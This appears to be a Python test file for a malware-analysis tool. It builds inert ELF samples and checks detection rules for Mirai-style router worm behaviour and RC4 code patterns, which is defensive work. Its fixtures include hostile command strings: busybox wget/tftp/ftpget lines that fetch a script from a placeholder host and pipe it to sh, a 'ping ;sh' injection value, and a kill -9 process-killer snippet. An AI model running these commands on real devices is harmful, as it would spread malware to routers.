#!/usr/bin/env python3
"""Test merged router command strings and RC4 operation boundaries in inert ELF."""
import argparse
import os
from pathlib import Path
import runpy
import subprocess
import tempfile

ROOT = Path(__file__).resolve().parents[3]
HELPERS = runpy.run_path(str(ROOT / "testdata/taxonomy/mirai-native-review/check.py"))
elf, reports, escaped = (HELPERS[k] for k in ("elf", "reports", "escaped"))
ENTRY = "micro-behaviors/process/create/shell/interactive::router-cli-shell-entry-sequence"
WORM = "objectives/lateral-movement/worm/device-network::router-shell-busybox-payload-propagation"
KILLER = "objectives/impact/degrade/process::router-propagation-deleted-image-killer"
RC4 = "micro-behaviors/crypto/symmetric/stream/rc4::"
WINDOWS = {
    "x86-initial-prga-buffer-xor": bytes.fromhex(
        "8a 5c 24 19 88 d8 25 ff 00 00 00 89 c6 8a 44 04 18 "
        "88 44 24 19 88 5c 34 18 88 d8 02 44 24 19 25 ff 00 00 00 "
        "8a 44 04 18 30 07"),
    "x86-xor-swap-prga-buffer-transform": bytes.fromhex(
        "8d 14 1f 89 c5 8d 0c 07 8a 02 32 01 88 02 32 01 88 01 "
        "30 02 31 c0 8a 44 2c 0c 8b 54 24 08 02 44 1c 0c 25 ff 00 00 00 "
        "8a 44 04 0c 30 04 16 46 39 74 24 04 75 9c"),
}


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--cleave", default="cleave")
    args = parser.parse_args()
    cases = []

    def case(name, rodata=b"", code=b"", yes=(), no=(), machine=3, endian="<"):
        cases.append((name, elf(rodata, code, machine, endian), set(yes), set(no)))

    merged = b"enable\0system\0linuxshell\0"
    padded = b"enable\0\0system\0\0shell\0\0\0sh\0\0linuxshell\0"
    case("merged.elf", merged, yes=[ENTRY], no=[WORM, KILLER])
    case("padded.elf", padded, yes=[ENTRY], no=[WORM, KILLER], machine=20, endian=">")
    case("missing-system.elf", b"enable\0linuxshell\0", no=[ENTRY, WORM, KILLER])
    case("unordered.elf", b"linuxshell\0system\0enable\0", no=[ENTRY, WORM, KILLER])
    case("prose.elf", b"enable system shell sh linuxshell\0", no=[ENTRY, WORM, KILLER])
    case("non-shell-cli.elf", b"enable\0system\0status\0", no=[ENTRY, WORM, KILLER])

    # Operation context is required separately: ordinary delivery commands do
    # not acquire a worm or competitor-killing verdict from their transport.
    delivery = (b"ping ;sh\0chmod +x .p; ./.p\0"
                b"/bin/busybox wget http://192.0.2.1/wget.sh -O- | sh;"
                b"/bin/busybox tftp -g 192.0.2.1 -r tftp.sh -l- | sh;"
                b"/bin/busybox ftpget 192.0.2.1 ftpget.sh ftpget.sh && sh ftpget.sh\0"
                b"/proc/%d/exe\0/fd/\0/bin/busybox echo -ne \0")
    script = escaped('${link%(deleted)}; kill -9 "$pid"')
    case("delivery-only.elf", delivery + script, no=[ENTRY, WORM, KILLER])
    case("merged-propagation.elf", merged + delivery + script, yes=[ENTRY, WORM, KILLER])
    case("padded-propagation.elf", padded + delivery + script, yes=[ENTRY, WORM, KILLER],
         machine=20, endian=">")
    case("propagation-no-kill.elf", merged + delivery, yes=[ENTRY, WORM], no=[KILLER])

    all_crypto = {RC4 + name for name in WINDOWS}
    for name, window in WINDOWS.items():
        case(name + ".elf", code=window, yes=[RC4 + name], no=all_crypto - {RC4 + name})
        case(name + "-data.elf", rodata=window, no=all_crypto)
        case(name + "-wrong-arch.elf", code=window, machine=40, no=all_crypto)
        changed = bytearray(window)
        # Remove only the final buffer XOR; state manipulation is insufficient.
        index = window.rindex(b"\x30\x07" if "initial" in name else b"\x30\x04\x16")
        changed[index:index + 2] = b"\x90\x90"
        case(name + "-no-output-xor.elf", code=changed, no=all_crypto)
        # A stack slot change must not pin the signature to one build.
        changed = bytearray(window)
        if "initial" in name:
            for index in (3, 16, 20, 24, 30, 39):
                changed[index] += 16
        else:
            for index in (25, 29, 33, 42, 50):
                changed[index] += 16
        case(name + "-stack-layout.elf", code=changed, yes=[RC4 + name])

    with tempfile.TemporaryDirectory(prefix="mirai-jkl-controls-") as tmp:
        targets = []
        for name, data, _, _ in cases:
            path = Path(tmp) / name
            path.write_bytes(data)
            targets.append(str(path))
        result = subprocess.run([
            args.cleave, "--no-update-check", "--traits-dir", str(ROOT),
            "--disable", "radare2,upx", "--format", "json", "analyze", *targets,
        ], capture_output=True, text=True, check=True,
           env={**os.environ, "CLEAVE_SKIP_CACHE": "1"})
        files = {Path(f["path"]).name: f for f in reports(result.stdout)}
        for name, _, yes, no in cases:
            ids = {t["id"] for t in files[name].get("traits", [])}
            assert yes <= ids, (name, "missing", yes - ids)
            assert not no & ids, (name, "unexpected", no & ids)
            print("PASS", name)
    print(f"{len(cases)} controls passed")


if __name__ == "__main__":
    main()
